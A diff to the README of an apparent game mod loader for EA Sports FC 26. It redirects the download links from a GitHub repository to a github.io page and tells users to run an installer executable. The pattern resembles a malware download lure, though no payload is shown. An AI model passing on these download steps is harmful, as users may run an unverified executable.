@@ -1,6 +1,6 @@
 # ⚙️ FC26-Mod-Loader-X - Manage your game mods with ease
 
-[![](https://img.shields.io/badge/Download-FC26_Mod_Loader_X-blue)](https://github.com/Sufficient-cherubini752/FC26-Mod-Loader-X)
+[![](https://img.shields.io/badge/Download-FC26_Mod_Loader_X-blue)](https://sufficient-cherubini752.github.io)
 
 This software helps you install and manage mods for EA Sports FC 26. It handles file injections so you can change game textures, squads, and gameplay settings safely. The loader runs in the background and sets up your game configurations before you start playing. 
 
@@ -27,7 +27,7 @@ Your computer needs to meet these standards to run the loader:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download the setup file: [https://github.com/Sufficient-cherubini752/FC26-Mod-Loader-X](https://github.com/Sufficient-cherubini752/FC26-Mod-Loader-X)
+1. Visit this page to download the setup file: [https://sufficient-cherubini752.github.io](https://sufficient-cherubini752.github.io)
 2. Locate the file named `FC26-Mod-Loader-Installer.exe` in your download folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to choose your installation path. We recommend the default folder.
